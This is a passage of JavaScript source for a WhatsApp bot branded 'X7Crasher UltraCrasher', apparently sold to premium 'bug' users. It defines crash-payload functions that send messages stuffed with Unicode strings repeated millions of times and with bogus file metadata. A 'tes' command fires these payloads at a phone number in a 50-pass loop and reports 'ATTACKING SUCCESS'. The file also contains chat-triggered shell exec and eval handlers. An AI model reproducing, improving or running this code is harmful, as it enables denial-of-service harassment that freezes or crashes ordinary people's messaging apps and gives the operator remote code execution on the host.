    'title': "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁⃰" + "々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰".repeat(9999999) + "͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢".repeat(9999999) + "📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰".repeat(9999999) + "̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉".repeat(9999999) + " ͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥".repeat(9999999) + "i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i".repeat(9999999) + " ͢ ͢͢꧅꙰꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰".repeat(9999999)
        'footerText': ⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁⃰,
        'buttonText': ⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁⃰,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'Detech',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'BauMemek',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: Vampire, quoted: qkontak });
await Vampire.relayMessage(target, etc.message, { participant: { jid: Vampire }, messageId: etc.key.id });
}
   async function uidoc(bugtarg, ptcp = false) {
    let uitext = "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁⃰" + "々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰".repeat(9999999) + "͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢".repeat(9999999) + "📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰".repeat(9999999) + "̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉".repeat(9999999) + " ͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥".repeat(9999999) + "i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i".repeat(9999999) + " ͢ ͢͢꧅꙰꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰".repeat(9999999)
    await xin.relayMessage(bugtarg, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/pdf',
                            fileSha256: "NpR4V+tVc+N2p3zZgKO9Zzo/I7LrhNHlJxyDBxsYJLo=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "6l+ksifBQsLHuJJGUs5klIE98Bv7usMDwGm4JF2rziw=",
                            fileName: "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/19392659_857576149596887_4268823484878612019_n.enc?ccb=11-4&oh=01_Q5AaIOQvG2wK688SyUp4JFWqGXhBQT6m5vUcvS2aBi0CXMTv&oe=676AAEC6&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: uitext
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " ⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁ " }]
                    }
                }
            }
        }
    }, { participant: { jid: bugtarg } }, { messageId: null });
}
async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await zyn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}
async function NewsletterZap(LockJids) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁⃰" + "々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰々꙰".repeat(9999999) + "͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢͢͢͢͢ꦾ҉͢͢".repeat(9999999) + "📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰📉҉꙰ೌೈ҉꙰".repeat(9999999) + "̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉̶⃟̶҉".repeat(9999999) + " ͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥͢🔥꙰ͮX꙰X꙰🔥".repeat(9999999) + "i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i⃟i".repeat(9999999) + " ͢ ͢͢꧅꙰꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰͢͢꧅꙰".repeat(9999999)
							"jpegThumbnail": "",
							"caption": `⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁`,
							"inviteExpiration": Date.now() + 1814400000
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await zyn.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}
async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await zyn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
//=================== [ End Off Function Bug ] =============\\
const reply = bokep => {
      Revan.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
          'mentionedJid': [kontol],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁",
            'body': `⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁`,
            'previewType': "PHOTO",
            'thumbnailUrl': 'https://img100.pixhost.to/images/590/539272068_skyzopedia.jpg',
            'sourceUrl': ''
          }
        }
      }, {
        'quoted': qkontak
      });
    };

switch (command) {

case "menu": {
const tampilan = `
bug attack
• tes
`
let menu = {
image: {url: `${ytta}`}, 
caption: tampilan,
contextInfo:{externalAdReply:{
title: '⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁',
body: '⌁⃰͢͢X͢7͢C͢r͢a͢s͢h͢e͢r々U͢l͢t͢r͢a͢C͢r͢a͢s͢h͢e͢r͢⌁', 
showAdAttribution: true,
thumbnailUrl: 'https://img100.pixhost.to/images/590/539272068_skyzopedia.jpg',
mediaType: 4,
MediaUrl: 'https://whatsapp.com/channel/0029VarWW4T47Xe43y5oUE1y',
sourceUrl: "https://whatsapp.com/channel/0029VarWW4T47Xe43y5oUE1y",
}}
}
await Revan.sendMessage(from, menu, {quoted: Out });
}
break
case "tes": {
if (!isPremium) return OnlyPremium()
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 50; i++) {
await loadingx()
await buk1(target, "Pantek Tanggapan Tidak Diterima Ehh Tanggapan Diterima", 1020000, ptcp = true);
await uidoc(bugtarg, ptcp = true)
await uidoc3(bugtarg, ptcp = true)
await locasifreeze(bugtarg, ptcp = true)
await sendQP(target, wanted, Porke, Porke2, Null)
await sendSessionStructure(target, wanted, Porke, Porke2, Null)
await NewsletterZap(target, wanted, Null, Porke, Porke2)
await old1(WynzX, target, Null, Porke, Porke2)
await old2(WynzX, target, Null, Porke, Porke2)
await old3(WynzX, target, Null, Porke, Porke2)
await beta1(target, wanted, Null, Porke, Porke2)
await beta2(target, wanted, Null, Porke, Porke2)
await Vampire5(Vampire, quoted, target, wanted, Null, Porke, Porke2)
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break

case "public": {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
ZoO.public = true
reply("*𝗫-𝗔𝗦𝗧𝗥𝗔𝗟 𝗠𝗘𝗠𝗔𝗦𝗨𝗞𝗜 𝗠𝗢𝗗𝗘 𝗣𝗨𝗕𝗟𝗜𝗖*")
}
break
case "self": {
if (!isOwner) return reply("𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗡𝗢𝗧 𝗚𝗔𝗜𝗡𝗘𝗗 𝗔𝗖𝗖𝗘𝗦𝗦")
ZoO.public = false
reply("*𝗫-𝗔𝗦𝗧𝗥𝗔𝗟 𝗠𝗘𝗠𝗔𝗦𝗨𝗞𝗜 𝗠𝗢𝗗𝗘 𝗦𝗘𝗟𝗙*")
}
break
case "addown":
if (!isOwner) return reply(`*\`LU BUKAN CREATOR BEGO\`*`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await ZoO.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./Databases/database/owner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case "delown":
if (!isOwner) return reply(`*\`LU BUKAN CREATOR BEGO\`*`)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./Databases/database/owner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case "addaccess":{
if (!isOwner) return reply(`*\`LU SIAPA NJINKK?\`*`)
if (!args[0]) return reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await ZoO.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`*\`MOHON MASUKAN NOMOR YG TERDAFTAR\`*`)
Premium.push(prrkek)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`*\`SUKSES MENJADI MURBUG!!\`*`)
}
break
case "delaccess":{
if (!isOwner) return reply(`*\`LU SIAPA NJINKK?\`*`)
if (!args[0]) return reply(`*\`PENGGUNA :\`* *${command} NOMOR*\n*\`EXAMPLE :\`* *${command} 628XXXX*`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
m4 = Premium.indexOf(ya)
Premium.splice(m4, 1)
fs.writeFileSync("./Databases/database/murbug.json", JSON.stringify(Premium))
reply(`*\`MAAF ANDA TIDAK LAGI MENJADI MURBUG!!\`*`)
}
break
//========= End All Case ========\\
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Revan.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Revan.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Revan.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
Revan.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Revan.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Revan.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
Revan.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})